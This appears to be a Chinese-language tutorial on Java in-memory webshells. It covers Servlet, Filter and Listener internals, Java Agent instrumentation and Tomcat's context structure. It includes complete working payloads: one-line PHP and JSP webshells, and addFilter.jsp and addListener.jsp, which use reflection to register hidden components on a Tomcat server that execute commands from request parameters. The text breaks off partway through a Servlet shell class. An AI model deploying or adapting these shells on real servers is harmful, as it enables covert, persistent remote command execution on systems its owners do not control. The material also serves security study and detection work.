 

# Java 内存马专题 

## 基本概念 

### 内存马

#### 什么是内存马

由于现在互联网已经渗透到人们的方方面面，无时无刻离不开互联网的支撑，甚至也影响了全球文化、社会、经济的发展。

而WEB作为互联网上应用范围最广、最典型的应用之一，在社会、经济活动中承担着重要角色，那么就会导致各种含金量极高的数据和信息由Web接收、转发、处理和存储。

在Web给人们带来经济效益的同时也成为网络攻击的主要目标。

**通常攻击**在发现 Web 应用上传漏洞后会上传一个 Webshell。

攻击者上传的Webshell 与网站管理员远程管理所使用的功能类似,通过 HTTP 请求接收命令并提供响应, 可穿越防火墙, 难以检测。

Webshell 最初包含的功能强大, 但是文件较大、服务器端代码较多; 针对网站对文件大小上传的限制, 逐渐演变为代码量小、只有单一上传文件功能的小文件; 为了更加隐蔽, Webshell 配合管理工具, 只需简单的脚本执行语句即可; 为了更好的躲避检测, Webshell 还采用了加密、混淆等手段。

但是随着时间的推演以及对传统WebShell关注度越来越高导致检测手段和方法更加健全，所以基于内存的WebShell就此诞生。

所谓的**内存马**就是**基于内存的WebShell**也就是**无文件的WebShell**。

是典型的无文件攻击的一种，由于近几年的HVV演练的热度越来越高，内存马也成为被热议和研究的技术。

内存马主要活跃在Java web框架、中间件等上，并且java以其灵活、健壮、跨平台等特点是主流的变成语言，所以本节课主要研讨Java内存马。

**早期的WebShell**：小马，大马，一句话木马。

#### 内存马的本质

1. 以**内存方式存在**的Web组件
2. **携带恶意功能**(Payload)，完成攻击者意图(植入马)

#### 内存马的特性

1. **隐蔽性强**：由于不存在于硬盘上，常规的文件系统检查无法发现内存马
2. **实时性**：内存马一旦植入，便可在系统启动时自动加载，无需等待文件系统挂载
3. **依赖性**：内存马通常依赖于特定的系统漏洞或配置错误，一旦修复这些漏洞，内存马就失效

#### 内存马植入方式

1. 基于容器组件来实现，被修改后其带恶意功能,修改掉组件，执行了恶意功能又返回
2. 将容器调用链中，向其新增自己的恶意组件，比如 **监听器-过滤器-响应器** 变为 **监听器-过滤器-恶意响应器—响应器**
3. 漏洞注入内存马 利用服务器上的安全漏洞
4. API注入内存马 滥用或误用应用程序提供的API接口，通过它们上传或执行恶意代码，从而在服务器内存中植入后门或木马程序

#### 内存马从语言上的分类

##### Java内存马：

**隐藏性**：利用Java的内存管理机制来隐藏自身，通过**动态代理**、**类加载器**（Class Loader）来动态加载恶意代码，使得代码在运行时才被编译和加载，增加了检测难度，利用Java的反射机制来动态调用方法。

**内存驻留**：Java内存马会在JVM的内存空间中长期驻留，不进行任何文件级别的持久化存储这意味着即使没有明显的文件痕迹，恶意代码仍然可以在内存中持续运行。

##### Python内存马：

利用**flask框架**中存在的**ssti注入**来实现内存修改的,

特征使用`importlib`或自定义的__import__操作来加载恶意模块，

使用threading或multiprocessing库创建持久化的线程或进程，

通过全局解释器锁（GIL）和其他内存分配策略来操纵内存，以及通过HTTP请求或其他通信手段向攻击者反馈系统状态。

##### .NET内存马：

**自我删除**进入**内存死循环繁殖**的**木马不断回连**的URL。

##### C/C++内存马：

使用`dlopen()`函数**加载恶意共享库**的自定义加载机制，

通过`system()`、`popen()`等方式执行系统命令，使用fork()创建子进程并在后台运行以隐藏恶意活动，

以及使用`malloc()`、`calloc()`或`realloc()`进行异常内存分配或重分配。

#### 内存马种类的逻辑性划分

1. 数据结构型内存马。
2. API型内存马。
3. 混合型内存马。

基于不同目标产生不同编写手法会出现混合内存马 既调用数据结构也调用API，具体看侧重方向。

4. 内核型内存马：

直接作用于操作系统的内核层面，而不是普通的应用程序级别，

根据不同的系统实现，`Windows liunx MAC`，利用对应的系统漏洞，内核模块和内核内存修改来进行注入系统内核马。

##### 数据结构型内存马：

利用**内存中数据结构**来存**储和执行恶意代码**的后门程序，直接在内存中修改数据，从而绕过一些安全检查，不依赖具体的API，

所以更加灵活，可以适用于更多的环境和场景,但要求对目标系统的内存结构和数据布局有深入的了解，而组件则通过操作数据结构实现特定功能。

攻击者则利用组件的特性造成内存马注入 

###### 例如：

> Servlet、Filter、Listener、Controller；

**哥斯拉**：`FilterShell`和`memoryShell`两种内存马这些内存马在运行时会创建和操作复杂的数据结构，会在内存中创建数据结构来存储和管理恶意代码的状态，或者使用数据结构来组织和管理被感染的系统的信息。

**蚁剑**：通过字节码直接注入恶意函数，然后通过方法名调用 涉及到了Java的类加载机制和方法调用机制，这些机制背后都有复杂的数据结构在支持例如，Java的类加载器会使用数据结构来存储和管理已加载的类，而方法调用则需要操作调用栈这种数据结构。

##### API型内存马：

通过`hook`或**替换目标应用程序**的**API函数**， 可以直接控制程序的执行流程，而且由于其是基于API的，所以更加稳定不容易出错；

但是API型内存马也有其**缺点**，那就是它**需要知道目标应用程序的API函数地址**，这就要求攻击者对目标系统的API有深入的了解此外，

API型内存马也**会影响到正常的API调用**，从而导致程序出现异常(内存飙高，流量抖动)。

用到的技术主要有`JavaAgent`和`Javassist`。

###### 例如：

> 冰蝎

JavaApi型内存马是比较依赖java版本的，在2004年之后Java由1.4升级到java5版本之后才开始支持JavaAgent技术。

JavaAgent：Javaagent技术允许开发者在Java应用程序启动时（通过premain方法）或者在运行时（通过agentmain方法）加载并执行代码这意味着内存马可以利用Javaagent技术，在应用程序启动时或者在运行时植入恶意代码，而不需要重新编译或部署整个应用程序。内存马可以利用Javaagent技术提供的Instrumentation API来修改类的字节码，从而实现持久化驻留在内存中，而不留下任何文件级别的痕迹这使得内存马更难被检测和清除。

Javassist：可以在运行时使用java编码动态修改和生成Java类的字节码，而无需了解底层的虚拟机指令内存马利用这个特性，在运行时动态地修改类定义，执行恶意操作，或者注入新的功能，由于Javassist提供的高级API使得操作字节码变得相对简单，内存马可以利用这一便利性，更容易地实现其恶意目的，同时也提高了自身的隐蔽性和生存能力

#### 传统WebShell

##### WebShell之一句话木马

###### 在php中

```php
<?php @eval($_POST['cmd']);?>
```

###### 在java中

```java
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

##### WebShell之小马：

体积小、容易被上传，一般只具备文件上传功能。

##### WebShell之一句话大马：

体积大、功能全，具有文件管理、数据库管理、账号权限管理的能力，可以理解为是一个集成的Shell合集。

例如：`jspSpy`。

#### JavaWeb项目中的码

##### 小马

![image-20241101085200761](https://image.201068.xyz/assets/8.Java内存马/image-20241101085200761.png)

##### 大马

可以在次明确所谓的大马就是**多个shell的集成**

![image-20241101085230221](https://image.201068.xyz/assets/8.Java内存马/image-20241101085230221.png)

##### 一句话木马

![image-20241101085244975](https://image.201068.xyz/assets/8.Java内存马/image-20241101085244975.png)

###### 核心代码：

![image-20241101085251576](https://image.201068.xyz/assets/8.Java内存马/image-20241101085251576.png)

### Servlet

![image-20241101143804864](https://image.201068.xyz/assets/8.Java内存马/image-20241101143804864.png)

http://localhost:8880/ServletJspProject_war_exploded/

![image-20241101143818039](https://image.201068.xyz/assets/8.Java内存马/image-20241101143818039.png)

#### Servlet之Filter：

##### Filter

`Filter`即**过滤器**，其作用是**请求到达servlet之前对其进行过滤，对其进行预处理**，

在servlet对于请求处理完毕返回后对响应对象进行后处理(和Spring中AOP技术相似，只不过AOP关注的是方法调用的切面，而Filter是对HTTP请求/响应的方面)。

`Filter`本身并不申请请求对象(Request)和响应对象(Response)， 只提供**过滤功能**。

Filter在设计的思想上和动态代理的思路是一样的，目的都是**对实际的业务功能进行增强**。

应用场景：登录验证、日志、关键字过滤等等

![image-20241101085349205](https://image.201068.xyz/assets/8.Java内存马/image-20241101085349205.png)

##### Filter的执行流程以及生命周期：

![image-20241101085356889](https://image.201068.xyz/assets/8.Java内存马/image-20241101085356889.png)

##### 生命周期三个方法：

```bash
init()、doFilter()、destroy()。
```

##### 开发流程：

1. 自定义java类实现Filter接口。
2. 通过配置`web.xml`或者使用注解的方式进行对Filter进行配置。

##### Filter的执行流程

![image-20241101085539888](https://image.201068.xyz/assets/8.Java内存马/image-20241101085539888.png)

#### Servlet之Listener

Listener是Servlet的**监听器**，它可以监听客户端的请求，服务端的操作。

 我们平常做开发的使用通常会**给按钮增加监听器**，点击这个按钮，触发一项监听事件，如`Java swing`开发中的`ActionListener`。

监听器Listener的内容就是在`application`,`session`,`request`三个对象**创建**、**销毁**或者往其中**添加修改删除**属性时自动执行代码的功能组件。

##### 监听器类型

那么三个域对象在servlet中对应的**监听器类型**是什么呢？

- 对Session的操作， HttpSessionListener
- 对Request的操作， ServletReuqestListener
- 对context的操作， ServletContextListener

##### HttpSessionListener

请求的创建和销毁

###### 作用: 

监听 HTTP 会话的生命周期事件。

###### 接口方法:

- sessionCreated(HttpSessionEvent se): 当新的会话被创建时调用。
- sessionDestroyed(HttpSessionEvent se): 当会话被销毁时调用。

###### 用途:

用于管理用户会话的状态，比如跟踪用户登录状态、监控会话过期、管理会话属性等。

适用于处理需要与用户会话相关的操作，如记录用户的活动或清理与用户会话相关的资源。

##### ServletRequestListener

请求的创建和销毁

###### 作用: 

监听 HTTP 请求的生命周期事件。

###### 接口方法:

- requestInitialized(ServletRequestEvent sre): 在请求被创建时调用。
- requestDestroyed(ServletRequestEvent sre): 在请求被销毁时调用。

###### 用途:

用于在请求处理开始和结束时执行一些逻辑，比如记录日志、添加请求属性等。

适用于处理每个单独的请求，例如，进行请求相关的初始化或清理操作。

##### ServletContextListener

上下文的初始化和销毁

###### 作用: 

监听 Servlet 上下文的生命周期事件。

###### 接口方法:

- contextInitialized(ServletContextEvent sce): 当 Servlet 上下文被初始化时调用。
- contextDestroyed(ServletContextEvent sce): 当 Servlet 上下文被销毁时调用。

###### 用途:

用于在应用启动和关闭时执行一些逻辑，例如加载应用配置、初始化资源、注册服务、清理全局资源等。

适用于处理与整个 `Web` 应用相关的操作，而不仅限于单个请求或会话。

#### Servlet

Servlet取自两个单词：`Server`、`Applet` （很符合 sun 公司的命名特点）， Java Servlet 的简称，

其实质就是**运行在 Web 应用服务器上的 Java 程序**，

与普通 Java 程序不同，它是位于 Web 服务器内部的服务器端的 Java 应用程序，可以对 Web 浏览器或其他 HTTP 客户端程序发送的请求进行处理。

**狭义的Servlet**是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。

Servlet运行于支持Java的应用服务器中。

从原理上讲，Servlet可以响应任何类型的请求，但绝大多数情况下Servlet只用来扩展基于HTTP协议的Web服务器。

**Servlet 对象**与普通的 Java 对象不同，它可以处理 Web 浏览器或其他 HTTP 客户端程序发送的 HTTP 请求，但前提是把 Servlet 对象布置到 Servlet 容器中，也就是说，其**运行需要 Servlet 容器的支持**。

有了 Servlet 之后，用户通过单击某个链接或者直接在浏览器的地址栏中输入 URL 来访问 Servlet ，Web 服务器接收到该请求后，并不是将请求直接交给 Servlet ，而是交给 Servlet 容器。

Servlet 容器实例化 Servlet ，调用 Servlet 的一个特定方法对请求进行处理， 并产生一个响应。

这个响应由 Servlet 容器返回给 Web 服务器，Web 服务器包装这个响应，以 HTTP 响应的形式发送给 Web 浏览器。

##### servlet生命周期：

通常情况下，Servlet 容器也就是指 Web 容器，如 Tomcat、Jboss、Resin、Weblogic 等，它们对 Servlet 进行控制。

当一个客户端发送 HTTP 请求时，由容器加载 Servlet 对其进行处理并做出响应。

在 Web 容器中，Servlet 主要经历 4 个阶段，如下图：

![image-20241101085637095](https://image.201068.xyz/assets/8.Java内存马/image-20241101085637095.png)

##### Servlet 的生命周期

`Servlet` 与 Web 容器的关系是非常密切的，在 Web 容器中 Servlet 主要经历了 4 个阶段，这 4 个阶段实质是 Servlet 的生命周期，由容器进行管理。

1. 在 **Web 容器启动**或者客户机第一次请求服务时，容器将**加载 Servlet 类**并将其放入到 **Servlet 实例池**。

2. 当 Servlet 实例化后，容器将**调用 Servlet 对象的 init() 方法**完成 Servlet 的**初始化**操作，

   主要是为了让 Servlet 在处理请求之前做一些初始化工作。

3. 容器通过 **Servlet 的 service() 方法**处理**客户端请求**。

   在 Service() 方法中，Servlet 实例根据不同的 HTTP 请求类型作出不同处理，并在处理之后作出相应的响应。

4. 在 **Web 容器关闭**时，容器**调用 Servlet 对象的 destroy() 方法**对**资源进行释放**。

   在调用此方法后，**Servlet 对象将被垃圾回收器回收**。

![image-20241101085716403](https://image.201068.xyz/assets/8.Java内存马/image-20241101085716403.png)

### Java Agent 探针

Java是一种**静态强类型语言**，在运行之前必须将其**编译**成`.class`**字节码**，然后再交给`JVM`处理运行。

`Java Agent`就是一种能在**不影响正常编译的前提**下，**修改Java字节码**，进而**动态地修改已加载或未加载的类、属性和方法**的技术。

也就是它可以在`main`函数执行之前做前置的`preMain`方法执行。

应用场景：**热部署，诊断工具，全链路跟踪**等。

![image-20241101085731929](https://image.201068.xyz/assets/8.Java内存马/image-20241101085731929.png)

#### Instrumentation 接口

使用 `Instrumentation`，开发者可以构建一个独立于应用程序的**代理程序**（Agent），用来**监测和协助运行在 JVM 上的程序**，甚至能够**替换和修改某些类的定义**。

有了这样的功能，开发者就可以实现**更为灵活**的运行时虚拟机监控和 Java 类操作了，这样的特性实际上提供了一种虚拟机级别支持的 AOP 实现方式，使得开发者无需对 JDK 做任何升级和改动，就可以实现某些 AOP 的功能了。

1. 在 `Java SE 5` 中，Instrument 要求在运行前利用命令行参数或者系统参数来设置代理类，

在实际的运行之中，虚拟机在初始化之时（在绝大多数的 Java 类库被载入之前），启动instrumentation 的设置，从而可以**在加载字节码之前,修改类的定义**。

2. 在 `Java SE6` 里面，则更进一步,可以在j`vm`运行时,**动态修改类定义**,使用就更方便了。

#### VirtualMachine 虚拟机 

字面意义表示一个J**ava 虚拟机**，也就是程序**需要监控的目标虚拟机**，

提供了**获取系统信息**、 `loadAgent`，`Attach` 和 `Detach` 等方法，可以实现的功能可以说非常之强大 。

该类允许我们通过给`attach`方法传入一个`jvm`的`pid`(进程id)，远程连接到`jvm`上 。

**代理类注入操作**只是它众多功能中的一个，通过`loadAgent`方法向`jvm`注册一个**代理程序agent**，

在该agent的代理程序中会得到一个`Instrumentation`实例。

#### premain和agentmain 方法

在`java agent`中有个`premain()`和`agentmain()`方法

而在这两种方法中可以结合`Instrumentation`的特性来实现在**启动**和**运行**时**动态侵入**和改写某个类中的方法！！ 

 java内存马的思路也是如此。

#### JavaInstrument项目

##### 下载

github：https://github.com/fa1c0n1/JavaInstrument

```bash
git clone https://github.com/fa1c0n1/JavaInstrument
cd JavaInstrument\hook-test
java -jar TargetApp.jar
java -jar AgentDemoStarter.jar
```

![image-20241101134356913](https://image.201068.xyz/assets/8.Java内存马/image-20241101134356913.png)



##### 导入tools库

###### Maven导入com.sun.tools.attach库

![image-20241101130431288](https://image.201068.xyz/assets/8.Java内存马/image-20241101130431288.png)

> D:/environment/Java/jdk1.8.0_151/lib/tools.jar

![image-20241101133259712](https://image.201068.xyz/assets/8.Java内存马/image-20241101133259712.png)

##### 设置路径

```bash
D:\codes\java_codes\JavaInstrument\hook-test\AgentDemo.jar
D:\codes\java_codes\JavaInstrument\hook-test\Bird.class
```

![image-20241101130622726](https://image.201068.xyz/assets/8.Java内存马/image-20241101130622726.png)

![image-20241101130705901](https://image.201068.xyz/assets/8.Java内存马/image-20241101130705901.png)

##### 打包

将`AgentDemo`和`AgentDemoStarter`打包

```bash
 <goal>single</goal>
```

![image-20241101132004005](https://image.201068.xyz/assets/8.Java内存马/image-20241101132004005.png)

![image-20241101132215663](https://image.201068.xyz/assets/8.Java内存马/image-20241101132215663.png)

##### 替换包

将`AgentDemo-1.0-SNAPSHOT-jar-with-dependencies.jar`替换为`AgentDemo.jar`

放到`hook-test`路径下

![image-20241101132449782](https://image.201068.xyz/assets/8.Java内存马/image-20241101132449782.png)

![image-20241101132525957](https://image.201068.xyz/assets/8.Java内存马/image-20241101132525957.png)

##### 运行项目

###### TargetAppMain

![image-20241101132637240](https://image.201068.xyz/assets/8.Java内存马/image-20241101132637240.png)

###### AttachApp

![image-20241101133537963](https://image.201068.xyz/assets/8.Java内存马/image-20241101133537963.png)

##### 效果

![image-20241101133601639](https://image.201068.xyz/assets/8.Java内存马/image-20241101133601639.png)



![image-20241101085846230](https://image.201068.xyz/assets/8.Java内存马/image-20241101085846230.png)

### 在谈tomcat

其实tomcat的本质是一个**Servlet容器**，

所以`Catalina`是整个tomcat的核心，其余的模块都是为核心做支撑服务的。

- 连接器Coyote提供连接通信
- JSP引擎Jasper提供JSP引擎
- 表达式语言JavaEL提供EL表达式支持
- 命名服务Naming提供JNDI服务
- 服务器日志Juli提供日志服务

![image-20241101085859192](https://image.201068.xyz/assets/8.Java内存马/image-20241101085859192.png)

#### Catalina结构

- Catalina负责管理Server；
- Server表示整个服务器
- Server中有多个服务Service
- 每个服务Service包含着多个Coyote实现的连接器组件Connector和一个容器组件`Container`

![image-20241101085935173](https://image.201068.xyz/assets/8.Java内存马/image-20241101085935173.png)

1. `Engine`：表示整个`Catalina`的**Servlet引擎**

用来管理多个虚拟站点,一个Service最多只能有一个Engine,但是一个Engine可以包含多个Host。

2. `Host`：表示一个**主机**或者是一个**虚拟站点**

可以给Tomcat配置多个虚拟主机地址,一个虚拟主机地址下可以包含多个Context

3. `Context`：表示一个**web应用程序**

一个尾部应用程序可以包含多个`Wrapper`

4. Wrapper：表示一个**Servlet容器**

Wrapper作为容器中的最底层,不可以包含子容器

![image-20241101085959353](https://image.201068.xyz/assets/8.Java内存马/image-20241101085959353.png)

![image-20241101090004034](https://image.201068.xyz/assets/8.Java内存马/image-20241101090004034.png)

在Tomcat的整体架构中,各个组件之间是松耦合的,确保了整体架构的**伸缩性和扩展性**。

`Container`采用**责任链模式**完成具体的请求处理,来保证**灵活性和扩展性**

#### Pipeline和Vavle接口

- `Pipeline`: **构建责任链**。
- `Valve`: 代表责任链上的每一个**处理器**。

`Pipeline`中维护了一个基础的`Valve`, 即StandardXxxValve. 始终位于Pipeline的末端,在最后执行,封装了具体的请求处理和输出响应过程。

可以调用`addVavle()`方法为`Pipeline`添加自定义的`Valve`, 自定义添加的Valve位于末尾的基础Valve之前,并且按照添加顺序执行。

`Pipeline`通过获取首个`Valve`来启动整个责任链的执行。

![image-20241101090105495](https://image.201068.xyz/assets/8.Java内存马/image-20241101090105495.png)

![image-20241101090121388](https://image.201068.xyz/assets/8.Java内存马/image-20241101090121388.png)

![image-20241101090131228](https://image.201068.xyz/assets/8.Java内存马/image-20241101090131228.png)

#### 关于Tomcat涉及的context：

在tomcat中有三个context：分别为`StandardContext`、`ApplicationContext`、`ServletContext`；

**ServletContext(接口)**：是javax.servlet包下是一个接口，它的本意是可以对某个Web应用的各种资源和功能进行访问，所以一般的servlet都要实现这个接口，一般通过request.getServletContext()获得。

**ApplicationContext(实现)**：是对ServerletContext接口的实现类，实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等，其实该类被包装在ApplicationContextFacade类中，利用ApplicationContextFacade包装的目的是想通过门面模式简化对上下文的操作。

**StandardContext(实际干活的)**：org.apache.catalina.Context接口的默认实现为StandardContext，而Context在Tomcat中代表一个web应用。ApplicationContext所实现的方法其实都是调用的StandardContext中的方法，StandardContext是Tomcat中真正起作用的Context。

向框架注入内存马的基础，就是要获得context，context实际上就是拥有当前中间件或框架处理请求、保存和控制servlet对象、保存和控制filter对象等功能的对象。而根据上述的信息可以知道，StandardContext是实现动态注入马的入口！！

### 基于Servlet的内存马

#### Filter内存马

##### 恶意代码

如果想在`Filter`中增加恶意代码那么只需要在`doFilter`方法上增加如下代码即可：

```java
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        if (request.getParameter("cmd") != null){
            Process exec = Runtime.getRuntime().exec(request.getParameter("cmd"));
            InputStream inputStream = exec.getInputStream();
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
            String output = scanner.hasNext() ? scanner.next() : "";
            response.getWriter().write(output);
            response.getWriter().flush();
        }        
           chain.doFilter(request,response);
    }
```

上面利用doFilter方法写入了一个恶意类，

那么如何找到注入点来动态的在内存中创建一个Filter对象，来实现Filter的内存马呢？

可以利用JSP作为载体在JSP中写入恶意类来实现此目的。

##### 整体思路

整体思路是首先要获得一个干活的context也就是StandardContext并且要通过StandardContext中的filterConfigs属性来动态注册Filter。

部分代码如下：

```java
//定义过滤器
final String name = "FilterMemShell"; 
//获取servletContext
ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
//获取ApplicationContext
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
//获取StandardContext
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
//获取 filterConfigs:存储当前上下文中注册的过滤器配置
Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
Configs.setAccessible(true);
Map filterConfigs = (Map) Configs.get(standardContext);

if (filterConfigs.get(name) == null) {
//创建过滤器实例:在doFilter方法中实现恶意类。
Filter filter = new Filter() 
//配置过滤器:
FilterDef filterDef = new FilterDef();
filterDef.setFilter(filter);
filterDef.setFilterName(name);
filterDef.setFilterClass(filter.getClass().getName());
standardContext.addFilterDef(filterDef);
//添加过滤器映射:
FilterMap filterMap = new FilterMap();
filterMap.addURLPattern("/*");
filterMap.setFilterName(name);
filterMap.setDispatcher(DispatcherType.REQUEST.name());
standardContext.addFilterMapBefore(filterMap);
//创建过滤器配置:
Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
constructor.setAccessible(true);
ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
//将过滤器配置放入 filterConfigs 中:
filterConfigs.put(name, filterConfig);
}

//配置过滤器:
FilterDef filterDef = new FilterDef();
filterDef.setFilter(filter);
filterDef.setFilterName(name);
filterDef.setFilterClass(filter.getClass().getName());
standardContext.addFilterDef(filterDef);

//相当于在web.xml中做了如下配置
<filter>
    <filter-name>FilterMemShell</filter-name>
    <filter-class>com.xxx.xxxFilterClass</filter-class>
</filter>

//添加过滤器映射:
FilterMap filterMap = new FilterMap();
filterMap.addURLPattern("/*");
filterMap.setFilterName(name);
filterMap.setDispatcher(DispatcherType.REQUEST.name());
standardContext.addFilterMapBefore(filterMap);


//相当于在web.xml中做了如下配置
<filter-mapping>
    <filter-name>FilterMemShell</filter-name>
    <url-pattern>/*</url-pattern>
    <dispatcher>REQUEST</dispatcher>
</filter-mapping>
```

##### addFilter.jsp

```jsp
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>

<!-- http://localhost:8076/addFilter.jsp -->
<!-- http://localhost:8076/?cmd1=whoami -->

<%
    final String name = "AutomneGreet";
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
				HttpServletRequest lrequest = (HttpServletRequest) servletRequest;
				HttpServletResponse lresponse = (HttpServletResponse) servletResponse;
                if (lrequest.getParameter("cmd1") != null){
					Process process = Runtime.getRuntime().exec(lrequest.getParameter("cmd1"));
					java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
							new java.io.InputStreamReader(process.getInputStream()));
					StringBuilder stringBuilder = new StringBuilder();
					String line;
					while ((line = bufferedReader.readLine()) != null) {
						stringBuilder.append(line + '\n');
					}
					lresponse.getOutputStream().write(stringBuilder.toString().getBytes());
					lresponse.getOutputStream().flush();
					lresponse.getOutputStream().close();
					return;
                }
                filterChain.doFilter(servletRequest,servletResponse);
            }

            @Override
            public void destroy() {

            }

        };


        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        	
        standardContext.addFilterDef(filterDef);

        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);

        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);

        filterConfigs.put(name,filterConfig);
        out.print("inject filter success");
    }
%>
```

###### 使用

http://localhost:8880/ServletJspProject_war_exploded/upload/addFilter.jsp

![image-20241101145006545](https://image.201068.xyz/assets/8.Java内存马/image-20241101145006545.png)

```bash
http://localhost:8880/ServletJspProject_war_exploded/upload/addFilter.jsp?cmd1=whoami
http://localhost:8880/ServletJspProject_war_exploded/upload/addFilter.jsp?cmd1=calc
```

![image-20241101145046896](https://image.201068.xyz/assets/8.Java内存马/image-20241101145046896.png)

![image-20241101145158051](https://image.201068.xyz/assets/8.Java内存马/image-20241101145158051.png)

#### Listener马

原理和刚才讲的Filter马是一样的，

都是需要先得到`StandardContext`类，

然后在通过`addApplicationEventListener`方法将定义好的带有恶意代码的`listener`类进行添加。

##### 代码如下

```java
//定义监听器：
class S implements ServletRequestListener{
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        

}

@Override
public void requestInitialized(ServletRequestEvent servletRequestEvent) {
    if(request.getParameter("cmd2") != null){
        try {
            Runtime.getRuntime().exec(request.getParameter("cmd2"));
        } catch (IOException e) {}
    }
}

}



ServletContext servletContext =  request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);

ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);

StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
S servletRequestListener = new S();
standardContext.addApplicationEventListener(servletRequestListener);
```

![image-20241101090435895](https://image.201068.xyz/assets/8.Java内存马/image-20241101090435895.png)

##### addListener.jsp

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<!-- http://localhost:8076/addListener.jsp -->
<!-- http://localhost:8076/?cmd2=calc -->

<%
class S implements ServletRequestListener{
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        if(request.getParameter("cmd2") != null){
            try {
                Runtime.getRuntime().exec(request.getParameter("cmd2"));
            } catch (IOException e) {}
        }
    }
}
%>

<%
ServletContext servletContext =  request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField("context");
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
Field stdctx = applicationContext.getClass().getDeclaredField("context");
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
out.println("inject listener success");
S servletRequestListener = new S();
standardContext.addApplicationEventListener(servletRequestListener);
%>

```

###### 使用

http://localhost:8880/ServletJspProject_war_exploded/upload/addListener.jsp

![image-20241101145921997](https://image.201068.xyz/assets/8.Java内存马/image-20241101145921997.png)

```
http://localhost:8880/ServletJspProject_war_exploded/upload/addListener.jsp?cmd2=calc
```

![image-20241101150254958](https://image.201068.xyz/assets/8.Java内存马/image-20241101150254958.png)

**一直在弹计算器**

#### Servlet马：

**原理和前面讲的差不多**，

首先需要对一个java类实现Servlet接口，并在service方法中编写恶意类，然后拿到`StandardContext`，

然后最后利用`Wrapper`设置路径并绑定对应的`servlet`。

但是`Servlet`马有个缺点就是需要访问对应的路径才能执行命令！

这样容易被发现。

##### 部分代码

```java
  //获取standardContext
    String name = Shell_Servlet.class.getSimpleName();
    ServletContext servletContext = request.getServletContext();
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(servletContext);
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext context = (StandardContext)standardContextField.get(applicationContext);
    //注册进context
    Wrapper wrapper = context.createWrapper();
    wrapper.setName(name);
    wrapper.setServletClass(Shell_Servlet.class.getName());
    wrapper.setServlet(new Shell_Servlet());
    context.addChild(wrapper);
    context.addServletMappingDecoded("/Memshell",name);
```

##### 恶意类

```java
   public class Shell_Servlet implements Servlet {
         @Override
        public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException {
            HttpServletRequest lrequest = (HttpServletRequest) req;
